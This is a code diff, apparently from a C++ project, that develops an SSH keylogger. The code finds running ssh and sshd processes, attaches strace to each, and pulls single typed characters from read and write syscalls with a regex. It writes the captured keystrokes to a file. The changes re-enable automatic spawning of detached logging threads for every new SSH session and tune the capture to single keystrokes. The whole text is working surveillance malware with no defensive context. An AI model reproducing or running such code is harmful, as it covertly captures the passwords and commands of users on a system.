@@ -41,29 +41,31 @@ private:
     std::string _args;
 };
 
-std::tuple<std::string, uint16_t, std::string, std::string> split_proc_info(std::string& proc_info){
-    auto user_size = proc_info.find(' ');
-    std::string user = proc_info.substr(0, user_size);
-    proc_info.erase(0, user_size);
-    while (proc_info[0] == ' '){
-        proc_info.erase(0, 1);
+void split_string(const std::string &s, char delim, std::vector<std::string> &elems) {
+    std::stringstream ss(s);
+    std::string item;
+    while (std::getline(ss, item, delim)) {
+        if (item.length() > 0) {
+            elems.push_back(item);
+        }
     }
-    auto pid_size = proc_info.find(' ');
-    uint16_t pid = std::stoi(proc_info.substr(0, pid_size));
-    proc_info.erase(0, user_size);
-    while (proc_info[0] == ' '){
-        proc_info.erase(0, 1);
-    }
-    std::tuple<std::string, uint16_t, std::string, std::string> splitted_proc_info = std::make_tuple(user, pid, "ssh", "args");
+}
+
+std::tuple<std::string, uint16_t, std::string, std::string> split_proc_info(const std::string& proc_info){
+    std::vector<std::string> elems = {};
+    char delim[] = " ";
+    split_string(proc_info, delim[0], elems);
+    std::tuple<std::string, uint16_t, std::string, std::string> splitted_proc_info = std::make_tuple(elems[0],
+            std::stoi(elems[1]), elems[10], elems[11]);
     return splitted_proc_info;
 }
 
-std::string parse_strace_output(std::string& output){
-    boost::regex xRegEx("read\\(\\d+, \"(?<cmd>\\w+)\", 16384\\)\\s+= ");
+std::string parse_strace_output(std::string& output, boost::regex& xRegEx){
     boost::smatch xResults{};
     boost::regex_search(output, xResults, xRegEx);
     if(!xResults.empty()){
-        std::cout << "FOUND: " << xResults[0] << std::endl;
+        std::cout << "FOUND_ALL: " << xResults[0] << std::endl;
+        std::cout << "FOUND_CMD: " << xResults["cmd"] << std::endl;
         if(xResults["cmd"] != "") return xResults["cmd"];
         else return "EMPTY";
     }
@@ -117,14 +119,15 @@ void ssh_keylogger(const uint16_t& pid){
     }
     std::array<char, 256> buffer{};
     while(fgets(buffer.data(), 256, pipe) != nullptr){
-        std::cout << "BUFFER_SSH: " << buffer.data() << std::endl;
+//        std::cout << "BUFFER_SSH: " << buffer.data() << std::endl;
         std::string data_from_strace{buffer.data()};
-        if(data_from_strace.find("read(") != std::string::npos && data_from_strace.find(", 16384") != std::string::npos &&
+        if(data_from_strace.find("read(") != std::string::npos && data_from_strace.find(", 1") != std::string::npos &&
                 data_from_strace.find("= 1\n") != std::string::npos){
             std::cout << "ACCEPTED_BUFFER: " << buffer.data() << std::endl;
-            std::string symbol = parse_strace_output(data_from_strace);
+            boost::regex xRegEx("read\\(\\d+, \"(?<cmd>\\w+)\", 1\\)\\s+= ");
+            std::string symbol = parse_strace_output(data_from_strace, xRegEx);
             std::cout << "SYMBOL: " << symbol << std::endl;
-            std::cout << std::fwrite(symbol.data(), 1, symbol.size(), fd);
+            std::cout << "WRITTEN: " << std::fwrite(symbol.data(), 1, symbol.size(), fd) << std::endl;
         } else {
             continue;
         }
@@ -135,7 +138,7 @@ void ssh_keylogger(const uint16_t& pid){
 
 void sshd_keylogger(const uint16_t& pid){
     std::cout << "Handling process(incoming SSH) " << pid << " by keylogger" << std::endl;
-    std::string strace_cmd= "strace -s 16384 -p " + std::to_string(pid) + " -e read 2>&1";
+    std::string strace_cmd= "strace -s 16384 -p " + std::to_string(pid) + " -e write 2>&1";
     FILE* pipe = popen(strace_cmd.c_str(), "r");
     if (!pipe)
     {
@@ -151,14 +154,15 @@ void sshd_keylogger(const uint16_t& pid){
     }
     std::array<char, 256> buffer{};
     while(fgets(buffer.data(), 256, pipe) != nullptr){
-        std::cout << "BUFFER_SSHD: " << buffer.data() << std::endl;
+//        std::cout << "BUFFER_SSHD: " << buffer.data() << std::endl;
         std::string data_from_strace{buffer.data()};
-        if(data_from_strace.find("read(") != std::string::npos && data_from_strace.find(", 16384") != std::string::npos &&
+        if(data_from_strace.find("write(") != std::string::npos && data_from_strace.find(", 1") != std::string::npos &&
                 data_from_strace.find("= 1\n") != std::string::npos){
             std::cout << "ACCEPTED_BUFFER: " << buffer.data() << std::endl;
-            std::string symbol = parse_strace_output(data_from_strace);
+            boost::regex xRegEx("write\\(\\d+, \"(?<cmd>\\w+)\", 1\\)\\s+= 1");
+            std::string symbol = parse_strace_output(data_from_strace, xRegEx);
             std::cout << "SYMBOL: " << symbol << std::endl;
-            std::cout << std::fwrite(symbol.data(), 1, symbol.size(), fd);
+            std::cout << "WRITTEN: " << std::fwrite(symbol.data(), 1, symbol.size(), fd) << std::endl;
         } else {
             continue;
         }
@@ -171,20 +175,20 @@ void check_ps(std::vector<uint16_t>& procs_in_monitoring){
     std::vector<Process> proc_list = get_proc_list_of_ssh();
     for (auto &proc : proc_list){
         if (proc.find_sshd()){
-//            auto it = std::find(procs_in_monitoring.begin(), procs_in_monitoring.end(), proc.get_pid());
-//            if(it == procs_in_monitoring.end()){
-//                procs_in_monitoring.emplace_back(proc.get_pid());
-//                std::thread sshd_keylog(sshd_keylogger, proc.get_pid());
-//                sshd_keylog.detach();
-//            }
+            auto it = std::find(procs_in_monitoring.begin(), procs_in_monitoring.end(), proc.get_pid());
+            if(it == procs_in_monitoring.end()){
+                procs_in_monitoring.emplace_back(proc.get_pid());
+                std::thread sshd_keylog(sshd_keylogger, proc.get_pid());
+                sshd_keylog.detach();
+            }
         }
         else if(proc.find_ssh()){
-//            auto it = std::find(procs_in_monitoring.begin(), procs_in_monitoring.end(), proc.get_pid());
-//            if(it == procs_in_monitoring.end()){
-//                procs_in_monitoring.emplace_back(proc.get_pid());
-//                std::thread ssh_keylog(ssh_keylogger, proc.get_pid());
-//                ssh_keylog.detach();
-//            }
+            auto it = std::find(procs_in_monitoring.begin(), procs_in_monitoring.end(), proc.get_pid());
+            if(it == procs_in_monitoring.end()){
+                procs_in_monitoring.emplace_back(proc.get_pid());
+                std::thread ssh_keylog(ssh_keylogger, proc.get_pid());
+                ssh_keylog.detach();
+            }
         }
     }
 }
